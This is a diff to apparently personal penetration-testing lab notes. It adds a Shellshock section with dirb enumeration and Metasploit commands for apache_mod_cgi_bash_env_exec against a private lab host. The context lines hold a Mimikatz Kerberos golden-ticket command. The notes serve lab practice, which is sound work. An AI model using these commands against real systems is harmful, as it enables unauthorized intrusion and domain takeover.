@@ -122,3 +122,29 @@ PtT
     kerberos::golden /domain:lpt.com /sid:<SID> /krbtgt:<HASH> /user:evil /ticket:evil.tck
 ![image](https://github.com/user-attachments/assets/24f1ebad-a84c-4a3a-a530-a711c97a9dfe)
 
+SHELLSHOCK
+---
+    Preparation on 192.168.0.24:
+    cd /usr/lib/cgi-bin/
+    sudo cp shellshock keygen
+![image](https://github.com/user-attachments/assets/54fc6039-d50f-41fd-a041-3550317af3b4)
+
+    Parrot:
+    dirb http://192.168.0.24
+    dirb http://192.168.0.24/cgi-bin
+![image](https://github.com/user-attachments/assets/f204f99d-7037-4c23-a3ba-4f2a83d00deb)
+![image](https://github.com/user-attachments/assets/c6e7b513-24e3-421d-9769-fbd7892ae987)
+
+    msfconsole
+    search shellshock
+    use exploit/multi/http/apache_mod_cgi_bash_env_exec
+    show options
+    set RHOSTS 192.168.0.24
+    set RPORT 80
+    set TARGETURI /cgi-bin/keygen
+
+
+LFI to RCE
+---
+   
+
